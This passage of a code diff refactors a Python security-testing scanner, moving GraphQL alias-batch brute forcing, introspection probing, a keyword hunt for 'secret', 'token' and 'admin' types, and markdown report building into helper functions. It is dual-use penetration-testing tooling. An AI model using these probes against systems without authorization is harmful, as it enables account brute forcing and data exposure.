+    if responses.get("errors"):
+        for err in responses["errors"]:
+            msg = err.get("message", "") if isinstance(err, dict) else str(err)
+            errors.append(msg)
+        if errors:
+            print(f"[?] GraphQL errors (may reveal schema): {errors[:3]}")
+
+    return {"successes": successes, "errors": errors}
 
 
 def test_graphql_alias_batch(
@@ -1021,38 +1322,13 @@ def test_graphql_alias_batch(
         f'm{i}: {field_name}({param_name}:"{v}"){{success}}' for i, v in enumerate(values)
     )
 
-    query = query_template.replace("{ALIASES}", alias_block)
+    query_result = _graphql_batch_query(url, query_template, alias_block, scanner_obj)
+    if "error" in query_result:
+        return {"error": query_result["error"]}
 
-    try:
-        r = scanner_obj._make_request(
-            "POST", url, json={"query": query}, headers={"Content-Type": "application/json"}
-        )
-    except requests.exceptions.RequestException as e:
-        print(f"[!] Request failed: {e}")
-        return {"error": str(e)}
-
-    print(f"[*] Response: status={r.status_code}, length={len(r.text)}")
-
-    try:
-        data = r.json()
-    except (ValueError, json.JSONDecodeError):
-        data = {}
-
-    successes: list[str] = []
-    errors: list[str] = []
-
-    if data.get("data"):
-        for alias, result in data["data"].items():
-            if isinstance(result, dict) and result.get("success"):
-                successes.append(alias)
-                print(f"[!] {alias} → SUCCESS")
-
-    if data.get("errors"):
-        for err in data["errors"]:
-            msg = err.get("message", "") if isinstance(err, dict) else str(err)
-            errors.append(msg)
-        if errors:
-            print(f"[?] GraphQL errors (may reveal schema): {errors[:3]}")
+    detection = _graphql_alias_detection(query_result["response"])
+    successes = detection["successes"]
+    errors = detection["errors"]
 
     if successes:
         print(f"[!] {len(successes)} successful values found in one request!")
@@ -1069,11 +1345,11 @@ def test_graphql_alias_batch(
         print("[-] No successes found")
 
     return {
-        "status": r.status_code,
+        "status": query_result["status"],
         "total_tested": len(values),
         "successes": successes,
         "errors": errors,
-        "response": data,
+        "response": query_result["response"],
     }
 
 
@@ -1123,6 +1399,58 @@ FIELD_QUERY_TEMPLATE = """{{
 }}"""
 
 
+def _graphql_send_introspection(url: str, session: SecurityScanner) -> dict[str, Any] | None:
+    response = session._make_request(
+        "POST",
+        url,
+        json={"query": INTROSPECTION_QUERY},
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        data = response.json()
+    except (ValueError, json.JSONDecodeError):
+        data = {}
+
+    return {"status": response.status_code, "text": response.text, "data": data}
+
+
+def _graphql_parse_schema(introspection_result: dict[str, Any]) -> list[dict[str, Any]]:
+    types = introspection_result.get("types", [])
+    interesting_types: list[dict[str, Any]] = []
+    for graphql_type in types:
+        type_name = graphql_type.get("name", "")
+        kind = graphql_type.get("kind", "")
+        fields = graphql_type.get("fields", [])
+
+        if type_name.startswith("__"):
+            continue
+
+        if kind == "OBJECT" and fields:
+            field_names = [field.get("name", "") for field in fields if field.get("name")]
+            if any(
+                keyword in type_name.lower()
+                for keyword in [
+                    "user",
+                    "admin",
+                    "auth",
+                    "session",
+                    "config",
+                    "secret",
+                    "flag",
+                    "token",
+                ]
+            ):
+                interesting_types.append(
+                    {
+                        "type": type_name,
+                        "fields": field_names,
+                        "reason": "interesting name",
+                    }
+                )
+                print(f"  [!] {type_name}: {field_names}")
+    return interesting_types
+
+
 def graphql_introspection(
     url: str,
     *,
@@ -1135,21 +1463,17 @@ def graphql_introspection(
     scanner_obj = _get_scanner_xss(url, scanner)
     print(f"[*] GraphQL introspection on {url}")
 
-    r = scanner_obj._make_request(
-        "POST",
-        url,
-        json={"query": INTROSPECTION_QUERY},
-        headers={"Content-Type": "application/json"},
-    )
+    introspection_result = _graphql_send_introspection(url, scanner_obj)
+    if introspection_result is None:
+        return {"introspection_enabled": False, "response": ""}
 
-    if r.status_code != 200:
-        print(f"  [-] Status {r.status_code}")
-        return {"error": f"HTTP {r.status_code}", "response": r.text[:200]}
+    status = introspection_result["status"]
+    response_text = introspection_result["text"]
+    data = introspection_result["data"]
 
-    try:
-        data = r.json()
-    except (ValueError, json.JSONDecodeError):
-        data = {}
+    if status != 200:
+        print(f"  [-] Status {status}")
+        return {"error": f"HTTP {status}", "response": response_text[:200]}
 
     if "data" not in data and "errors" in data:
         errors = data.get("errors", [])
@@ -1163,7 +1487,7 @@ def graphql_introspection(
     schema = data.get("data", {}).get("__schema", {})
     if not schema:
         print("  [-] No schema in response")
-        return {"introspection_enabled": False, "response": r.text[:500]}
+        return {"introspection_enabled": False, "response": response_text[:500]}
 
     types = schema.get("types", [])
     queries = schema.get("queries", {}).get("name", "")
@@ -1176,29 +1500,7 @@ def graphql_introspection(
     print(f"      Mutation type: {mutations if mutations else 'none'}")
     print(f"      Subscription type: {subscriptions if subscriptions else 'none'}")
 
-    interesting_types: list[dict[str, Any]] = []
-    for t in types:
-        type_name = t.get("name", "")
-        kind = t.get("kind", "")
-        fields = t.get("fields", [])
-
-        if type_name.startswith("__"):
-            continue
-
-        if kind == "OBJECT" and fields:
-            field_names = [f.get("name", "") for f in fields if f.get("name")]
-            if any(
-                kw in type_name.lower()
-                for kw in ["user", "admin", "auth", "session", "config", "secret", "flag", "token"]
-            ):
-                interesting_types.append(
-                    {
-                        "type": type_name,
-                        "fields": field_names,
-                        "reason": "interesting name",
-                    }
-                )
-                print(f"  [!] {type_name}: {field_names}")
+    interesting_types = _graphql_parse_schema(schema)
 
     return {
         "introspection_enabled": True,
@@ -1374,6 +1676,86 @@ def _finding_severity(finding: dict[str, Any]) -> str:
     return max_sev
 
 
+def _format_finding_text(finding: dict[str, Any], *, index: int = 1) -> str:
+    indicators = finding.get("indicators", [])
+    max_sev = _finding_severity(finding)
+
+    lines = [
+        f"### Finding #{index}: {max_sev} — {finding.get('type', 'vulnerability')}",
+        "",
+        f"- **Endpoint:** `{finding.get('endpoint', 'N/A')}`",
+        f"- **Method:** {finding.get('method', 'N/A')}",
+        f"- **Payload:** `{finding.get('payload', 'N/A')}`",
+    ]
+    if indicators:
+        lines.append(f"- **Indicators:** {', '.join(indicators)}")
+    if finding.get("details"):
+        lines.append("- **Details:**")
+        for detail in finding["details"]:
+            lines.append(f"  - {detail}")
+    return "\n".join(lines)
+
+
+def _format_report_markdown(
+    findings: list[dict[str, Any]],
+    target: str | None,
+    *,
+    history: list[dict[str, Any]] | None = None,
+) -> str:
+    test_history = history or []
+    lines: list[str] = [
+        "# Security Assessment Report",
+        "",
+        f"**Target:** {target}",
+        f"**Generated:** {datetime.now().isoformat()}",
+        f"**Findings:** {len(findings)}",
+        f"**Tests run:** {len(test_history)}",
+        "",
+    ]
+
+    by_indicator: dict[str, list[dict[str, Any]]] = {}
+    for finding in findings:
+        for indicator in finding.get("indicators", []) or [finding.get("type", "unknown")]:
+            by_indicator.setdefault(indicator, []).append(finding)
+
+    if not findings:
+        lines.extend(["## Summary", "", "No vulnerabilities detected."])
+        return "\n".join(lines)
+
+    lines.extend(
+        [
+            "## Summary",
+            "",
+            "| Indicator | Count |",
+            "|:----------|:------|",
+        ]
+    )
+    for indicator, items in sorted(by_indicator.items(), key=lambda item: -len(item[1])):
+        lines.append(f"| {indicator} | {len(items)} |")
+    lines.append("")
+
+    lines.extend(["## Findings", ""])
+    ordered_findings = sorted(
+        findings,
+        key=lambda finding: SEVERITY_ORDER.get(_finding_severity(finding), 0),
+        reverse=True,
+    )
+    for index, finding in enumerate(ordered_findings, 1):
+        lines.extend(_format_finding_text(finding, index=index).splitlines())
+        lines.append("")
+
+    return "\n".join(lines)
+
+
+def _format_report_text(
+    findings: list[dict[str, Any]],
+    target: str | None,
+    *,
+    history: list[dict[str, Any]] | None = None,
+) -> str:
+    return _format_report_markdown(findings, target, history=history)
+
+
 def generate_report(
     scanner_or_findings: SecurityScanner | list[dict[str, Any]],
     target: str | None = None,
@@ -1407,65 +1789,9 @@ def generate_report(
             default=str,
         )
 
-    lines: list[str] = [
-        "# Security Assessment Report",
-        "",
-        f"**Target:** {target}",
-        f"**Generated:** {datetime.now().isoformat()}",
-        f"**Findings:** {len(findings)}",
-        f"**Tests run:** {len(history)}",
-        "",
-    ]
-
-    by_indicator: dict[str, list[dict[str, Any]]] = {}
-    for f in findings:
-        for ind in f.get("indicators", []) or [f.get("type", "unknown")]:
-            by_indicator.setdefault(ind, []).append(f)
-
-    if not findings:
-        lines.extend(["## Summary", "", "No vulnerabilities detected."])
-        return "\n".join(lines)
-
-    lines.extend(
-        [
-            "## Summary",
-            "",
-            "| Indicator | Count |",
-            "|:----------|:------|",
-        ]
-    )
-    for ind, items in sorted(by_indicator.items(), key=lambda x: -len(x[1])):
-        lines.append(f"| {ind} | {len(items)} |")
-    lines.append("")
-
-    lines.extend(["## Findings", ""])
-    ordered_findings = sorted(
-        findings,
-        key=lambda finding: SEVERITY_ORDER.get(_finding_severity(finding), 0),
-        reverse=True,
-    )
-    for i, f in enumerate(ordered_findings, 1):
-        indicators = f.get("indicators", [])
-        max_sev = _finding_severity(f)
-
-        lines.extend(
-            [
-                f"### Finding #{i}: {max_sev} — {f.get('type', 'vulnerability')}",
-                "",
-                f"- **Endpoint:** `{f.get('endpoint', 'N/A')}`",
-                f"- **Method:** {f.get('method', 'N/A')}",
-                f"- **Payload:** `{f.get('payload', 'N/A')}`",
-            ]
-        )
-        if indicators:
-            lines.append(f"- **Indicators:** {', '.join(indicators)}")
-        if f.get("details"):
-            lines.append("- **Details:**")
-            for d in f["details"]:
-                lines.append(f"  - {d}")
-        lines.append("")
-
-    return "\n".join(lines)
+    if format == "text":
+        return _format_report_text(findings, target, history=history)
+    return _format_report_markdown(findings, target, history=history)
 
 
 def save_report(
